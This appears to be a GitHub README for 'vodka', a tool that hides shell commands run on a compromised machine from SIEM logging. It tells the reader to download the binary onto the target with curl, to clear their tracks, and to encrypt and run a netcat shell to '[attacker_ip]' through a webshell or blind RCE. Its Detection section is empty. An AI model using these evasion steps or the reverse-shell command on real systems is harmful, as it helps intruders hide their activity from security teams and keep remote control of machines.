
<div align="center">
 <h1> vodka 🧊</h1>  
 <h4> Shell command obfuscation to avoid SIEM detection </h4>
 <p> During pentest, an important aspect is to be stealth. For this reason you should clear your tracks after your passage. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the cleaning part alone useless.<br><br><code>vodka</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, vodka execute for you).</p>

  <p><strong><code>{ <a href="#usage">Use it</a> ; <a href="#hide-from">🧊<sub>(hide from)</sub></a>; <a href="#detection">👁️<sub>(detected by)</sub></a> } </code></strong></p>
</div>

## Usage

You need to get an interactive shell. (Find a way to spawned it, you are a hacker, it's your job !). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed 
```shell
## Download it from github release
## If you do not have internet access from compromised machine, find another way
curl -lO -L https://github.com/ariary/vodka/releases/latest/download/vodka

## Execute it
./vodka

## You are now under the radar
vodka » echo "Hy SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cocky
vodka » [command]
```

### from non interactive shell

Imagine you have a non interactive shell (webshelk or blind rce), you could use `encrypt` and `decrypt` subcommand.
Previously, you need to build `vodka` with embedded encryption key.

**On attacker machine**
```shell
## ATTACKER MACHINE

## Build vodka with encryption key
make build.vodka-with-enc

## Transfer it on TARGET (the unique detectable command)
## [...]

## Encrypt the command you want to stealthy execute
## (Here a nc bindshell to obtain a interactive shell)
vodka encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
**encrypted cmd**
```

Copy encrypted command and executed it with your rce **on target machine**
```
./vodka decrypt [encrypted_command]
##Now you have a bindshell shell, spawn it to make it interactive and use vodka normally)

```


## Hide from

Only the `vodka` lauch command line will be catched

## Detection
